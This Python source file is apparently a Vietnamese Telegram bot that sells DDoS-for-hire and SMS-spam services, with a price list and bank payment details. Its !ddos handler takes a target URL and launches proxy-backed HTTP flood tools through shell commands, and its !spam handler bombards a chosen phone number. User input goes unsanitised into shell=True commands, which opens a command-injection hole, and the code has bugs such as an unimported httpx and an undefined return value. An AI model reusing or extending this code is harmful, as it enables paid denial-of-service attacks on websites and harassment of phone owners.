import time
import random
import threading
import subprocess
import uuid
import sys
import os
import json
from datetime import date
try:
    import speedtest
    import requests
    #import httpx
    import telebot
except Exception as noti:
    sys.exit(noti)

#Kết Nối Đến File config.json
file_config = open("config.json","r")
config = json.load(file_config)

#Kết Nối Đến Máy Chủ Telegram
bot = telebot.TeleBot(config['main']['token_Telegram'])

def check_user(id):
    file_user = open("database/user.json","r")
    user = json.load(file_user)
    nam = int(user[str(id)]['key'][0])
    thang = int(user[str(id)]['key'][1])
    ngay = int(user[str(id)]['key'][2])
    today = date.today()  
    if nam > today.year:
        return "Premium"
    elif nam < today.year:
        return "Free"
    elif nam == today.year:
        if thang > today.month:
            return "Premium"
        elif thang < today.month:
            return "Free"
        elif thang == today.month:
            if ngay >= today.day:
                return "Premium"
            else:
                return "Free" 
    return stt

#Thực Thi Lệnh /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    file_user = open("database/user.json")
    user = json.load(file_user)
    if str(message.from_user.id) in user:
        if check_user(message.from_user.id) == "Premium":
            text = config['main']['banner']+"  • Họ & Tên: "+message.from_user.first_name+" "+message.from_user.last_name+"\n\n  • Id: "+str(message.from_user.id)+"\n\n  • Username: "+message.from_user.username+"\n\n  • Mode: Premium\n_____________________________________\n\n Xin Chào !!"
            bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
        else:
            text = config['main']['banner']+"  • Họ & Tên: "+message.from_user.first_name+" "+message.from_user.last_name+"\n\n  • Id: "+str(message.from_user.id)+"\n\n  • Username: "+message.from_user.username+"\n\n  • Mode: Free\n_____________________________________\n\n Xin Chào !!"
            bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
    else:
        datapy = {message.from_user.id: {"key":["2000", "1", "1"],"delay_ping":config['main']['delay_ping']}}
        datajs1 = ","+json.dumps(datapy, indent=4)[1:]
        vitri = file_user.tell()
        a = int(vitri-1)
        file_user.seek(0,0)
        datajs = file_user.read()[:a]+datajs1
        f = open("database/user.json","w+")
        f.write(datajs)
        f.close
        text = config['main']['banner']+"  • Họ & Tên: "+message.from_user.first_name+" "+message.from_user.last_name+"\n\n  • Id: "+str(message.from_user.id)+"\n\n  • Username: "+message.from_user.username+"\n\n  • Mode: Free\n_____________________________________\n\n Xin Chào !!"
        bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

#Thực Thi Lệnh /pay
@bot.message_handler(commands=['pay'])
def send_pay(message):
	text = config['main']['banner']+"  < BẢNG GIÁ >\n\n  [ 🎃 ] Spam SMS: 15k/vinhvien\n\n  [ 🎃 ] DDoS: 10k/tháng\n_____________________________________\n\n  < THÔNG TIN >\n\n  • Tên TK: "+config['pay']['name']+"\n\n  • Số TK: "+config['pay']['stk']+"\n\n  • Ngân Hàng: "+config['pay']['bank_name']+"\n\n  • Nội Dung CK: "+config['pay']['noi_dung']+"\n_____________________________________"
	bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

#Thực Thi Lệnh /help
@bot.message_handler(commands=['help'])
def send_help(message):
	text = config['main']['banner']+config['main']['command']
	bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

#Thực Thi Lệnh /setting
@bot.message_handler(commands=['setting'])
def send_setting(message):
	text = config['main']['banner']+config['main']['setting']
	bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

#Thực Thi Lệnh !ddos
@bot.message_handler(regexp=config['main']['key_command']+"ddos")
def ddos(message):
    file_user = open("database/user.json")
    user = json.load(file_user)
    if check_user(message.from_user.id) == "Premium":
        if 10 < int(message.text.split(" ")[3]) < int(config['main']['attack_time_limit_premium']):
            target = message.text.split(" ")[2]
            floodtime = int(message.text.split(" ")[3])
            thread = int(10)
            if "HTTP1" in message.text:
                text = config['main']['banner']+"  < DDOS/HTTP1 >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy 10'], shell=True)
            elif "HTTP2" in message.text:
                http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
                with open("utils/http.txt", 'w') as p:
                    p.write(requests.get(http_proxy).text)
                os.system(f'node utils/L7/https2 {target} {floodtime} 1')
                text = config['main']['banner']+"  < DDOS/HTTP2 >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

            elif "YOLANDA" in message.text:
                text = config['main']['banner']+"  < DDOS/YOLANDA >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy 3'], shell=True)
            elif "STORM" in message.text:
                text = config['main']['banner']+"  < DDOS/STORM >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm 10'], shell=True)
            elif "NULL" in message.text:
                text = config['main']['banner']+"  < DDOS/NULL >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x 10'], shell=True)
            else:
                text = "Không Tìm Thấy Phương Thức Tấn Công: "+message.text.split(" ")[1]
                bot.send_message(message.chat.id, text)
        else:
            text = "Có Vẻ Như Bạn Đã Chỉnh Thời Gian Là Số Âm Hoặc Quá Cao So Với Cấp Bậc Hiện Tại"
            bot.send_message(message.chat.id, text)
    else:
        if 10 < int(message.text.split(" ")[3]) < int(config['main']['attack_time_limit_normal']):
            target = message.text.split(" ")[2]
            floodtime = int(message.text.split(" ")[3])
            thread = int(10)
            if "HTTP1" in message.text:
                text = config['main']['banner']+"  < DDOS/HTTP1 >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Free\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy 10'], shell=True)
            elif "HTTP2" in message.text:
                http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
                with open("utils/http.txt", 'w') as p:
                    p.write(httpx.get(http_proxy).text)
                subprocess.run([f'screen -dm node utils/L7/https2 {target} {floodtime} 1'], shell=True)
                text = config['main']['banner']+"  < DDOS/HTTP2 >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Free\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

            elif "YOLANDA" in message.text:
                text = config['main']['banner']+"  < DDOS/YOLANDA >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy 3'], shell=True)
                text = config['main']['banner']+"  < DDOS/YOLANDA >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Free\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

            elif "STORM" in message.text:
                text = config['main']['banner']+"  < DDOS/STORM >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm 10'], shell=True)
                text = config['main']['banner']+"  < DDOS/STORM >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Free\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

            elif "NULL" in message.text:
                text = config['main']['banner']+"  < DDOS/NULL >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Premium\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
                with open("proxy_providers.txt", mode="r") as readurl:
                    for url in readurl:
                        url = url.strip()
                        with open("proxies.txt", mode="a") as file:
                            file.write(requests.get(url, timeout=1000).text)
                subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x 10'], shell=True)
                text = config['main']['banner']+"  < DDOS/NULL >\n\n  URL: "+target+"\n\n  Time: "+str(floodtime)+"\n\n  Mode: Free\n_____________________________________"
                bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)

            else:
                text = "Không Tìm Thấy Phương Thức Tấn Công: "+message.text.split(" ")[1]
                bot.send_message(message.chat.id, text)
        else:
            text = "Có Vẻ Như Bạn Đã Chỉnh Thời Gian Là Số Âm Hoặc Quá Cao So Với Cấp Bậc Hiện Tại"
            bot.send_message(message.chat.id, text)

#Thực Thi Lệnh !spam
@bot.message_handler(regexp=config['main']['key_command']+"spam")
def spam(message):
    file_user = open("database/user.json")
    user = json.load(file_user)
    if check_user(message.from_user.id) == "Premium":
        if 0 < int(message.text.split(" ")[2]) < int(config['main']['attack_number_limit_premium']):
            phone = message.text.split(" ")[1]
            amount = int(message.text.split(" ")[2])
            subprocess.run([f'python utils/SPAM/spam.py {phone} {amount}'], shell=True)
            text = config['main']['banner']+"  < SPAM >\n\n  SĐT: "+phone+"\n\n  Số Lần: "+str(amount)+"\n\n  Mode: Premium\n_____________________________________"
            bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
        else:
            text = "Có Vẻ Như Bạn Đã Chỉnh Số Lần Là Số Âm Hoặc Quá Cao So Với Cấp Bậc Hiện Tại"
            bot.send_message(message.chat.id, text)
    else:
        if 0 < int(message.text.split(" ")[2]) < int(config['main']['attack_number_limit_normal']):
            phone = message.text.split(" ")[1]
            amount = int(message.text.split(" ")[2])
            subprocess.run([f'python utils/SPAM/spam.py {phone} {amount}'], shell=True)
            text = config['main']['banner']+"  < SPAM >\n\n  SĐT: "+phone+"\n\n  Số Lần: "+str(amount)+"\n\n  Mode: Premium\n_____________________________________"
            bot.send_photo(message.chat.id, open("img/banner.png", "rb"), text)
        else:
            text = "Có Vẻ Như Bạn Đã Chỉnh Số Lần Là Số Âm Hoặc Quá Cao So Với Cấp Bậc Hiện Tại"
            bot.send_message(message.chat.id, text)
        
        
        
        
        
        
bot.infinity_polling()